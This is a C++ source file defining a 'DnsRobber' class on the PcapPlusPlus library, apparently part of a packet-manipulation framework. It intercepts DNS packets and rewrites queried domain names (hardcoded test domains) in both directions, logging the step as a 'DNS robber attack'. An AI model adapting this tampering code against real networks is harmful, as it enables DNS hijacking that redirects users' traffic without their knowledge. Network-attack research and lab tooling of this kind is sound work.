#include "Action.cpp"
#include "fstream"
#include "iostream"
#include "pcapplusplus/DnsLayer.h"
#include "pcapplusplus/EthLayer.h"
#include "pcapplusplus/HttpLayer.h"
#include "pcapplusplus/IPv4Layer.h"
#include "pcapplusplus/Packet.h"
#include "pcapplusplus/PcapFileDevice.h"
#include "pcapplusplus/PcapLiveDeviceList.h"
#include "pcapplusplus/TcpLayer.h"
#include "pcapplusplus/UdpLayer.h"
#include "pcapplusplus/VlanLayer.h"
#include <stdlib.h>
#include <string.h>

using namespace std;
using namespace pcpp;

class DnsRobber : public Action {

public:
    static const int level = 5;
    int n{2};

    DnsRobber(){};
    ~DnsRobber(){};

    void singleCraftInGoing(Packet *inPacket) {
        bool hit = false;
        DnsQuery *q;
        DnsLayer *response = inPacket->getLayerOfType<DnsLayer>();
        if (response == NULL || (q = response->getFirstQuery()) == NULL)
            return;
        //DOC: eseguo la sostituzione
        do {
            map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
            for (auto &dnsname : substitutions) {
                if (q->getName().compare(dnsname.first) == 0 && q->setName(dnsname.second)) {
                    DEBUG("\t>> DNS robber attack is going: " << dnsname.first << " --> " << dnsname.second << endl);
                }
            }
            this->shots++;
        } while ((q = response->getNextQuery(q)) != NULL);
        inPacket->computeCalculateFields();
        return;
    };

    vector<RawPacket *> *craftInGoing(RawPacket *inPacket) {
        Packet parsedPacket(inPacket);
        vector<RawPacket *> *pp = new vector<RawPacket *>();
        //TODO: adesso la sostituzione è in query ed in answer e ritorna malformed packet. Separare??
        DnsQuery *q;
        DnsLayer *response = parsedPacket.getLayerOfType<DnsLayer>();
        if (response == NULL || (q = response->getFirstQuery()) == NULL)
            return nullptr;
        do {
            DEBUG(q->getName());
            //*(map<string, string> *)(c.data)
            map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
            for (auto &dnsname : substitutions) {
                if (q->getName().compare(dnsname.first) == 0 && q->setName(dnsname.second))
                    DEBUG(" --> " << dnsname.second << endl);
            }
            this->shots++;
        } while ((q = response->getNextQuery(q)) != NULL);
        pp->push_back(inPacket);
        return pp;
    }

    vector<RawPacket *> *craftOutGoing(RawPacket *inPacket) {
        Packet parsedPacket(inPacket);
        vector<RawPacket *> *pp = new vector<RawPacket *>();
        //TODO: adesso la sostituzione è in query ed in answer e ritorna malformed packet. Separare??
        DnsQuery *q;
        DnsLayer *response = parsedPacket.getLayerOfType<DnsLayer>();
        if (response == NULL || (q = response->getFirstQuery()) == NULL)
            return nullptr;
        do {
            DEBUG("url to resolve: " << q->getName() << endl);
            //*(map<string, string> *)(c.data)
            map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
            for (auto &dnsname : substitutions) {
                if (q->getName().compare(dnsname.first) == 0 && q->setName(dnsname.second))
                    DEBUG(" --> " << dnsname.second << endl);
            }
            this->shots++;
        } while ((q = response->getNextQuery(q)) != NULL);
        pp->push_back(inPacket);
        return pp;
    }

    static bool isDns(Packet *p) {
        return p->getLayerOfType<DnsLayer>() != nullptr;
    }
};